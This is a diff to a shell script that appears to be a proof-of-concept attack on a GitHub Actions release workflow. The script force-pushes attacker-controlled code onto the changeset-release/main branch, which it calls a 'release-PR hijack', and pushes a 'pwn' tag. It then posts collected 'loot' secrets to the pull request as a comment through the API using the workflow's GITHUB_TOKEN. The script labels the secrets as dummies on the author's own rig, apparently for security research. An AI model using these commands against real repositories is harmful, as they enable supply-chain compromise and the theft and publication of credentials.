@@ -21,7 +21,14 @@ echo "--- push PR-head tree onto changeset-release/main (release-PR hijack) ---"
 git push -f origin HEAD:refs/heads/changeset-release/main && echo "PUSH-TO-RELEASE-BRANCH: OK"
 echo "--- push tag v0.0.0-pwn ---"
 git push -f origin HEAD:refs/tags/v0.0.0-pwn && echo "TAG-PUSH: OK"
-BODY=$(python3 -c "import json;print(json.dumps({'body':'**PoC loot (own rig, dummy secrets)**\n\n```\n'+open('$LOOT').read()+'\n```'}))")
+export LOOT
+BODY=$(python3 - <<'PYEOF'
+import json, os
+body = "**PoC loot (own rig, dummy secrets)**\n\n```\n" + open(os.environ['LOOT']).read() + "\n```"
+print(json.dumps({"body": body}))
+PYEOF
+)
 curl -s -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
+  -H "Content-Type: application/json" \
   "https://api.github.com/repos/${GH_REPO}/issues/${PR_NUMBER}/comments" -d "$BODY" \
   | python3 -c "import json,sys;print('COMMENT-POSTED:', json.load(sys.stdin)['html_url'])"
